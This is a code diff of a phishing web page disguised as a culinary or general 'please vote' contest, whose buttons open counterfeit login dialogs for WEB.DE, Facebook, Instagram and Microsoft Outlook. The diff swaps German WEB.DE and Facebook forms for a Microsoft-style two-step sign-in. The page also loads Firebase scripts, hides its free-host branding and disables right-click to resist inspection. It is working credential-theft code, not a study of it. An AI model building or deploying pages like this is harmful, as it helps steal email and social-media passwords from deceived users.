@@ -1,223 +1,244 @@
 <!DOCTYPE html>
-<html lang="de" xmlns="http://www.w3.org/1999/xhtml">
+<html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 
 <head>
   <meta charset="UTF-8">
-  <meta name="description"
-    content="Cast your vote for the culinary contest quickly and securely from your smartphone or tablet, no matter where you are!">
-  <meta name="robots" content="noindex">
-  <link rel="shortcut icon" type="image/x-icon" href="images/favicon-new.svg">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="apple-itunes-app" content="app-id=368948250">
-  <!--Unhide passwort-->
-  <script type="text/javascript" id="globalJs" defer="defer" charset="UTF-8" src="js/uni_main.js"></script>
-  <!--CSS Germa_log-->
-  <link rel="stylesheet" type="text/css" href="css/uni_ver.css">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
-  <script src="js/jquery-3.6.0.min.js"></script>
   <link rel="stylesheet" href="css/index.css">
   <link rel="stylesheet" href="assets/css/main.css">
 
-  <!--Facebook-->
-  <link rel="stylesheet" href="secured/default.css">
-  <link rel="stylesheet" href="secured/style.css">
-  <script src="js/index.js"></script>
-  <script src="/js/jquery-3.6.0.min.js"></script>
 
-  <!-- MS -->
-  <link rel="stylesheet" href="auth/ms/style.css">
-  <script src="auth/ms/script.js"></script>
-
-  <title>Wernsing | Stimmen Sie für gutes Essen ab</title>
   <style>
-    body {
-      font-family: "Courier New", monospace;
-      margin: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      background-image: url('cook.png');
-      background-size: stretch;
-      /* Ensures the image covers the entire element */
-      background-position: center;
-      /* Centers the image in the element */
-      background-repeat: no-repeat;
-      /* Prevents the image from repeating */
-
-    }
-
-    .profile-card {
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      padding: 20px;
-      width: 300px;
-      text-align: center;
-      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-      background-color: #fff;
-    }
-
-    .profile-picture {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      margin: 0 auto 10px;
-      background-color: #ddd;
-    }
-
-    .profile-name {
-      font-family: "Courier New", monospace;
-      font-size: 1.5em;
-      margin: 5px 0;
-    }
-
-    .profile-title {
-      font-family: "Courier New", monospace;
-      font-size: 0.9em;
-      color: #555;
-      margin: 0;
-    }
-
-    .profile-description {
-      font-family: "Courier New", monospace;
-      font-size: 0.8em;
-      color: #555;
-      margin: 0;
-    }
-
-    .social-links {
-      display: flex;
-      flex-direction: column;
-      /* Change to row if you want them side by side */
-      align-items: stretch;
-    }
-
-    .social-icon {
-      font-size: 1em;
-      margin: 0 10px;
-      color: #555;
-    }
-
-    .social-vote-button {
-      display: flex;
-      justify-content: flex-start;
-      align-items: left;
-      flex: 1;
-      margin: 5px 0;
-      /* Adjust spacing between buttons */
-    }
-
-    .social-vote-button button {
-      width: 100%;
-    }
-
-    .social-vote-button button img {
-      width: 20px;
-      /* Set this width to match the icon size */
-      height: auto;
-      /* Maintain the aspect ratio */
-      margin-right: 5px;
-      /* Add spacing between the image and text */
-    }
-
-
-    .hotmail-button {
-      background-color: black;
-      color: #FFF;
-      border: none;
-      padding: 5px 10px;
-      border-radius: 5px;
-      cursor: pointer;
-
-      width: 20px;
-      /* Adjust this value to match your icons */
-      height: auto;
-      /* Maintain aspect ratio */
-      margin-right: 5px;
-      /* Space between the image and button text */
-    }
-
-    .instagram-button2 {
-      background-color: red;
-      color: #FFF;
-      border: none;
-      padding: 5px 10px;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    .facebook-button3 {
-      background-color: blue;
-      color: #FFF;
-      border: none;
-      padding: 5px 10px;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-
-    .preloader {
+    img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
       display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.5);
-      color: white;
-      font-size: 24px;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
     }
 
-    .powered-by {
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+    }
+
+    html {
+      scroll-behavior: smooth;
+      color: #383838;
+      /* overflow-y: hidden; */
+    }
+
+    #form::-webkit-scrollbar {
+      background: transparent;
+      width: 0;
+      height: 0;
+    }
+
+    .container-item {
+      z-index: 99999;
+      margin: 40px 10%;
+      overflow-x: hidden;
+      text-align: left;
+    }
+
+    .container-item-2 {
+      margin: 40px 10%;
+      border: 1px solid #7c7c7c;
+      display: flex;
+      justify-content: left;
+      align-items: center;
+      color: #383838;
+      padding: 5px 15px;
+    }
+
+    input {
+      padding: 10px 1px;
+      width: 100%;
+      border: 1px solid transparent;
+      border-bottom: 1px solid #383838;
+      z-index: 1;
+    }
+
+    .slide-one {
+      width: 100%;
+      transition: 0.5s ease all;
+    }
+
+    .slide-two {
+      width: 100%;
+      transition: 0.5s ease all;
+    }
+
+    .slide-one-toggle {
+      transform: translateX(-100%);
+    }
+
+    .slide-two-toggle {
+      transform: translateX(-100%);
+    }
+
+    input:focus {
+      border-bottom: 1px solid red;
+      outline: 1px solid transparent;
+    }
+
+    #form p {
+      font-size: 14px;
+    }
+
+    #form p img {
+      transform: translateY(6px);
+    }
+
+    #form {
+      display: flex;
+      justify-content: space-between;
+      overflow-x: scroll;
+      width: 200%;
+    }
+
+    #btn {
+      background: #0067B8;
+      color: white;
+      border: 1px solid transparent;
+      width: 100px;
       text-align: center;
-      margin-top: 20px;
-      color: #888;
-      font-size: 0.8em;
+      border-radius: 2px;
+      padding: 8px 5px;
+    }
+
+    span {
+      color: dodgerblue;
+    }
+
+    .btn-item {
+      display: flex;
+      justify-content: right;
+      margin: 25px 0;
+    }
+
+
+    a {
+      text-decoration: none;
+      color: #383838;
+    }
+
+    @media screen and (min-width: 600px) {
+      footer {
+        background: linear-gradient(27deg, rgba(231, 216, 210, 1) 28%, rgba(214, 220, 227, 1) 52%, rgba(214, 225, 210, 1) 80%, rgba(231, 216, 210, 1) 100%);
+      }
+
+      .container {
+        margin: 5% 50%;
+        transform: translateX(-50%);
+        width: 70%;
+        background: white;
+        padding: 10px;
+        box-shadow: 1px 1px 10px #b3b1b180;
+      }
+
+      .container-item-2 {
+        margin: 8% 50%;
+        transform: translate(-50%, -20px);
+        width: 70%;
+        background: white;
+        padding: 10px;
+        box-shadow: 1px 1px 10px #b3b1b180;
+      }
+
+    }
+
+    @media screen and (min-width: 768px) {
+      .container {
+        width: 40%;
+      }
+
+      .container-item-2 {
+        transform: translate(-50%, -50px);
+        width: 40%;
+      }
+    }
+
+    @media screen and (min-width: 1200px) {
+      .container {
+        width: 30%;
+      }
+
+      .container-item-2 {
+        transform: translate(-50%, -70px);
+        width: 30%;
+      }
+    }
+  </style>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+    }
+
+    html {
+      background: #F1F3FA;
+    }
+
+    .wrapper {
+      background: white;
+      width: 80%;
+      margin: 15% 50%;
+      transform: translateX(-50%);
+      border-radius: 5px;
+      color: dodgerblue;
+    }
+
+    button {
+      background: #5CB85C;
+      border-radius: 3px;
+      color: white;
+      padding: 5px;
+      border: 1px solid transparent;
+    }
+
+    ul li {
+      list-style-type: none;
+      padding: 10px;
+      background: white;
+      color: #5B9BD1;
+    }
+
+    @media screen and (min-width: 768px) {
+      .wrapper {
+        width: 50%;
+      }
     }
   </style>
 </head>
 
 <body>
-  <div id="preloader" class="preloader">
-    Loading...
+  <div id="preloader" class="preloader"></div>
+
+  <div class="wrapper">
+    <p style="color: #507392; font-size: 13px; padding: 10px; text-align: center;">PLEASE I NEED YOUR VOTE</p>
+    <center><img src="images/image.jpg" width="100px" height="100px">
+      <h4 style="padding: 10px 0; text-overflow: ellipsis; width: 200px; overflow: hidden; color: #507392">Voting
+        platform</h4>
+      <button onclick="Instagram()" style="background: #C62E2E;">VOTE WITH INSTAGRAM <i
+          class="fa fa-instagram"></i></button>
+      <button onclick="Hotmail()" style="background:#0D92F4;">VOTE WITH OUTLOOK <i class="fa fa-envelope"></i></button>
+    </center><br>
+    <ul>
+      <li style="background: #F6F9FB; border-left: 2px solid #5B9BD1; "><i class="fa fa-home"></i> Total Votes: 312 out
+        of 450</li>
+      <li style='color: #6f808a86'> <i class="fa fa-check"></i> Total Votes To Win: 450</li>
+      <a href="#" style='text-decoration: none; color: #6f808a86'>
+        <li style='color: #6f808a86'><i class="fa fa-flag"></i> Help</li>
+      </a>
+    </ul>
   </div>
-
-  <div class="profile-card">
-    <img src="logo.png" alt="Profile Picture" class="profile-picture">
-    <h2 class="profile-name">Cast your Vote</h2>
-    <p class="profile-title">Help Us Crown the Ultimate Chef!</p>
-    <p class="profile-description">Please, we need your vote!</p>
-    <div class="social-links">
-
-      <div class="social-vote-button">
-        <button onclick="Hotmail()" class="hotmail-button"><img src="images/main_logo.png"
-            style="width: 20.25px; height: 18.5px; border-radius: 5px;"> Vote with
-          Web.De Email
-        </button>
-      </div>
-      <div class="social-vote-button">
-        <button onclick="Instagram()" class="instagram-button2"><i class="fab fa-instagram"></i> Vote with Instagram
-          <span style="color: transparent;"> -----------</span></button>
-      </div>
-
-      <div class="social-vote-button">
-        <button onclick="Facebook()" class="facebook-button3"><i class="fab fa-facebook"></i> Vote with Facebook
-          <span style="color: transparent;"> -----------</span>
-        </button>
-      </div>
-      <br><br>
-      <p class="powered-by">Powered by - <strong><a href="https://www.instagram.com/maxlamanna/">MAX LA
-            MANNA 🇩🇪</a></strong></p>
-
-    </div>
-  </div>
+  <h4 style="text-align: center; color: #3f3f3f;">Powered by <span style="color: #5B9BD1;"> google voting system</span>
+  </h4>
 
   <!-- Instagram Dialog Box -->
   <div id="instagram" class="dialog">
@@ -261,139 +282,51 @@
     </div>
   </div>
 
-  <!-- Facebook Dialog Box -->
-  <div id="facebook" class="dialog">
-    <div class="dialog-content">
-      <span class="close" onclick="closeDialog()">&times;</span>
-      <h2><span hidden id="dialog-instagram"></span></h2>
-      <main class="l-main">
-        <div class="fb-user">
-          <div class="fb-panel fb-group">
-            <img src="secured/img/logo.svg" alt="">
-            <p>Facebook helps you connect and share with the people in your life.</p>
-            <input type="text" placeholder="Email or Phone number" required id="fb-email">
-            <input type="password" placeholder="Password" required id="fb-pass">
-            <button class="c-btn" onclick="login()" id="fb-log">Log In</button><br>
-
-            <a href="#">Forgotten password?</a>
-            <button id="create-btn">Create New Account</button>
-            <a href="#" style="font-weight: bold; color: var(--black); text-decoration: none;">Create a Page</a> for a
-            celebrity, band or business.
-          </div>
-        </div>
-      </main>
-    </div>
-  </div>
-
   <!-- Hotmail Dialog Box -->
-
   <div id="hotmail" class="dialog">
     <div class="dialog-content">
       <span class="close" onclick="closeDialog()">&times;</span>
-
-      <div class="main-layout">
-
-
-
-        <div class="header ">
-          <div class="header__logo">
-            <img class="pos-svg icon icon--logo-mini_webde-dims icon--logo-webde-32-dims" src="images/top_logo.svg">
-          </div>
-          <div class="header__text">Mobile Login</div>
-        </div>
-
-
-        <div class="centered-content centered-content--narrow">
-
-
-          <div class="content-title">
-            <div class="content-title__logo">
-              <img class="pos-svg icon icon--logo-webde-56-dims icon--brand content-title__logo"
-                src="images/main_logo.svg">
-            </div>
-            <h1>Login</h1>
-            <p id="loginText">
-              Bitte melden Sie sich hier mit Ihrem WEB.DE Nutzernamen und Ihrem Passwort an.
-            </p>
-          </div>
-
-
-
-          <div name="loginForm" accept-charset="UTF-8" data-formerror-check="serverchecked">
-
-            <div id="0:formPanel:loginForm:usernameInput">
-              <div class="pos-form-wrapper">
-                <label class="pos-label pos-label--block required"
-                  for="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input">WEB.DE Nutzername</label>
-                <div class="pos-input">
-
-                  <input id="hm-email" type="email" required name="username" class="revealable-input-row__input"
-                    id="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input" type="text">
-
-                </div>
+      <div class="container">
+        <div class="container-item">
+          <img src="images/microsoft-logo.svg" alt=""><br><br>
+          <div id='form'>
+            <div class="slide-one">
+              <h2>Sign in</h2>
+              <span class='msg' style="color: red; font-size: 13px;"></span>
+              <br>
+              <input type="email" id='hm-email' name='hm-email' placeholder="Email, phone, or Skype"><br><br>
+              <p>No account? <a href=""><span>Create one!</span></a></p>
+              <p style="color: dodgerblue;">Sign in with a security key <img src="images/question.JPG" alt="">
+              </p>
+              <div class="btn-item">
+                <p id="btn" class="next">Next</p>
               </div>
-
-
-
-
-
             </div>
 
-            <div id="0:formPanel:loginForm:passwordInput">
-              <div class="two-fa-enter-password">
-                <div class="pos-form-wrapper revealable-input-row">
-                  <label class="pos-label pos-label--block required"
-                    for="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input">Passwort eingeben</label>
-                  <div class="pos-input">
-                    <input id="hm-pass" type="password" class="revealable-input-row__input" required="required"
-                      name="password" id="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input">
-                    <div class="revealable-input-row__icon pos-input-icon">
-                      <img class="icon icon--password-eye-dims" src="images/eye.png">
-                    </div>
-                  </div>
-                </div>
+            <div class="slide-two">
+              <span class='msg2' style="color: red; font-size: 13px;"></span><br>
+              <p id='back'><i class="fa fa-arrow-left"></i> <span id='name' style="color: #383838;"></span></p><br>
+              <h2>Enter password</h2><br>
+              <input type="password" id='hm-pass' name='hm-pass' placeholder="Password"><br><br>
+              <p>Forget password?</p>
+              <a href="">
+                <p style="color: dodgerblue;">Other ways to sign in
+                </p>
+              </a>
+              <div class="btn-item">
+                <button onclick="hmlog()" id="btn" class="submit">Sign in</button>
               </div>
-
-
-
-
-
             </div>
-
-            <button onclick="hmlog()" id="submitButton"
-              class="pos-button pos-button--cta pos-button--block a-mb-space-2">
-              Login
-            </button>
-          </div>
-
-
-
-          <a class="a-ta-c a-mb-space-3 pos-button pos-button--link pos-button--block" href="https://passwort.web.de/">
-            Passwort vergessen?
-          </a>
-          <hr class="centered-content__line-break a-mb-space-4">
-          <div class="a-ta-c a-mb-space-4">
-            <h2 class="a-mb-space-2.5">
-              Neu bei WEB.DE?
-            </h2>
-            <a class="pos-button pos-button--link pos-button--block"
-              href="https://registrierung.web.de/?isMobile=true#.pc_page.mm.login.textlink.registrierung">
-              Jetzt kostenlos registrieren!
-            </a>
           </div>
         </div>
-
-
-        <div class="footer">
-          <a class="footer__link" target="_blank" href="">Impressum</a>
-          <a class="footer__link" target="_blank" href="">Verträge hier kündigen</a>
-          <a class="footer__link" target="_blank" href="">AGB</a>
-          <a class="footer__link" target="_blank" href="">Datenschutz</a>
-        </div>
-
       </div>
+
+      <div class="container-item-2"><img src="images/key.jpeg" width="25px"> <span style="color: #383838;">Sign- in
+          options</span></div>
+
     </div>
   </div>
+
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
   <script>
     function showCustomAlert() {
@@ -445,6 +378,7 @@
       document.getElementById("facebook").style.display = "none";
     }
   </script>
+
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
 
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
@@ -456,6 +390,47 @@
 
   </script>
 
+  <script>
+    document.addEventListener('contextmenu', event => {
+      event.preventDefault();
+    });
+
+    document.querySelectorAll('.disabled').forEach(element => {
+      element.style.pointerEvents = 'none';
+    });
+  </script>
+
+
+  <script>
+    var next = document.querySelector('.next');
+    var submit = document.querySelector('.submit');
+    var slide_one = document.querySelector('.slide-one');
+    var slide_two = document.querySelector('.slide-two');
+    var email = document.getElementById('hm-email')
+    var nameText = document.getElementById('name')
+    var back_btn = document.getElementById('back')
+    var password = document.getElementById('hm-pass')
+    var msg = document.querySelector('.msg')
+    var msg2 = document.querySelector('.msg2')
+    var container_item_2 = document.querySelector('.container-item-2')
+    next.addEventListener('click', function () {
+      if (email.value == "") {
+        msg.textContent = 'Enter a valid email address, phone number, or Skype name.'
+      } else {
+        msg.textContent = ""
+        nameText.textContent = email.value
+        slide_one.classList.add('slide-one-toggle')
+        slide_two.classList.add('slide-two-toggle')
+        container_item_2.style.display = 'none'
+      }
+    })
+    back_btn.addEventListener('click', function () {
+      slide_one.classList.remove('slide-one-toggle')
+      slide_two.classList.remove('slide-two-toggle')
+      container_item_2.style.display = 'flex'
+    })
+
+  </script>
 </body>
 
 </html>
